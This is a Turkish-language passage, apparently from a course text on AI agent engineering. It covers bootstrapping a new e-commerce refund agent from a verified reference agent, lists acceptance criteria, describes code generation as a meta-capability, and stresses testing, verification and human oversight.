Örnekte amaç, e-ticaret iade taleplerini karşılayan bir Agent oluşturmaktır.

```
reference/
├── agent.py
├── tools/
├── system_prompt.md
└── config.yaml

        ↓ Kopyala ve uyarla

new_agent/
├── agent.py           # Miras alınan Agent döngüsü
├── tools/refund.py    # Yeni iade aracı
├── system_prompt.md   # E-ticaret iade kuralları
└── config.yaml        # Model ve parametre ayarları
```

Kabul kriterleri yalnızca yeni Agent’ın açılması değildir. Şunlar da kontrol edilmelidir:

- Standart mesaj biçimleri ve tool çağrısı protokolleri kullanılıyor mu?
    
- Model ve API tercihleri güncel mi?
    
- Birden fazla konuşma turunda context ve durum korunuyor mu?
    
- Agent, hedeflenen temel görevleri başarıyla tamamlıyor mu?
    
- Sıfırdan üretime kıyasla örnekten uyarlama kalite ve verimlilik sağlıyor mu?
    

Bu deneyin temel amacı, kod üreten bir sistemin yalnızca dosya yazmasını değil, çalışabilir ve test edilebilir bir Agent sistemi ortaya çıkarmasını sağlamaktır.

## 6. Bölüm 5’in genel sentezi: Kod neden bir meta-yetenektir?

## Kod üretimi

Hem görev tamamlama aracı hem de başka yetenekleri kurma mekanizması

Düşünme aracı

Hesaplama, kısıt çözümü ve sembolik akıl yürütme.

İş kuralı kısıtları

Kritik işlemler için deterministik doğrulama ve güvenlik sınırları.

Multimedya üretimi

PPT, video ve diğer içeriklerde üretim ve değerlendirme döngüsü.

Sistem adaptörü

Log analizi, teşhis ve değişen sistem formatlarına uyum.

Üretici UI

Dinamik formlar, görselleştirmeler ve özelleştirilebilir arayüzler.

Agent Bootstrapping

Agent oluşturma, uyarlama ve kendi çalışma ortamını onarma.

Bölümün daha geniş mühendislik sonucu da önemlidir: Coding Agent’ların güvenilirliği yalnızca modelin ne kadar iyi kod yazdığına bağlı değildir. Testler, tip sistemleri, sürüm kontrolü, hata kurtarma yolları ve doğrulama mekanizmaları bir araya gelerek güçlü bir harness oluşturur.

Başarısızlık yönetiminde de benzer bir ilke geçerlidir: güvenilir bir sistem, hiç hata yapmayan sistem değil; farklı hata sınıflarını tespit etme, kurtarma, insan denetimine devretme veya güvenli biçimde sonlandırma yolları bulunan sistemdir.

## 7. Derin düşünme soruları

Bunlar yalnızca tanım soruları değil; tasarım kararlarını gerekçelendirmeni gerektiren mühendislik problemleridir.

1Güvenlik ve yetenek dengesi

2Bootstrap hatalarının birikmesi

3Uyum mu, anormallik mi?

4Reviewer ve kullanıcı tercihi

5Kurallarda çöp toplama

6Yapay zekâya hazır ekip

7Dört unsurlu güvenlik modeli

8Agent kod üretir, sistem yürütür

## Sonuç

Agent Bootstrapping, doğrulanmış bir Agent’ın mimarisini koruyarak yeni görevler için uyarlanmasını sağlar. Buradaki asıl değer yalnızca kodu yeniden kullanmak değildir; daha önce kazanılmış mühendislik bilgisini, mimari kararları ve doğrulama pratiklerini yeni sistemlere aktarabilmektir.

Bununla birlikte, her yeni nesil bağımsız olarak test edilmelidir. Kodun kod üretmesi, kendi başına kalite veya güvenlik garantisi değildir. Meta-yetenek ancak üretim + doğrulama + güvenli yürütme + geri bildirim döngüsüyle anlamlı hale gelir.

